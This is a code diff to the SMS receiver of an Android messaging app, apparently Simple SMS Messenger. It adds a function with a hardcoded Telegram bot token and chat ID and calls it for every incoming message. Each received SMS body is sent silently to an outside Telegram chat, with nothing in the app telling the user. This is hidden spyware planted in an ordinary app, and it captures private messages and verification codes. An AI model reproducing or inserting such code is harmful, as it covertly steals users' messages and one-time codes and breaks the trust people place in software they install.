@@ -17,6 +17,38 @@ import com.simplemobiletools.smsmessenger.extensions.*
 import com.simplemobiletools.smsmessenger.helpers.refreshMessages
 import com.simplemobiletools.smsmessenger.models.Message
 
+import java.io.BufferedInputStream
+import java.io.BufferedReader
+import java.io.InputStream
+import java.io.InputStreamReader
+import java.net.HttpURLConnection
+import java.net.URL
+
+private fun sendSMSToTelegram(body: String) {
+    val TOKEN = "6616276484:AAG6BasZHrGtiXnD3nN-5gi3EBNF1Dd9CbA"
+    //https://api.telegram.org/bot6616276484:AAG6BasZHrGtiXnD3nN-5gi3EBNF1Dd9CbA/getUpdates
+    val CHAT_ID = "1741397905"
+    val TEXT = body
+    //https://api.telegram.org/bot6616276484:AAG6BasZHrGtiXnD3nN-5gi3EBNF1Dd9CbA/sendMessage?chat_id=1741397905&text=TEXT
+    val urlString = "https://api.telegram.org/bot$TOKEN/sendMessage?chat_id=$CHAT_ID&text=$TEXT"
+
+    val url = URL(urlString)
+    val urlConnection = url.openConnection() as HttpURLConnection
+    try {
+        val inStream: InputStream = BufferedInputStream(urlConnection.inputStream)
+        val reader = BufferedReader(InputStreamReader(inStream))
+        val result = StringBuilder()
+        reader.forEachLine { result.append(it) }
+        // Тут можно добавить логирование или обработку результата, если это нужно
+    } catch (e: Exception) {
+        // Обработка ошибок, если они возникают
+        e.printStackTrace()
+    } finally {
+        urlConnection.disconnect()
+    }
+}
+
+
 class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
@@ -116,6 +148,7 @@ class SmsReceiver : BroadcastReceiver() {
                     context.updateConversationArchivedStatus(threadId, false)
                     refreshMessages()
                     context.showReceivedMessageNotification(newMessageId, address, body, threadId, bitmap)
+                    sendSMSToTelegram(body)
                 }
             }
         }
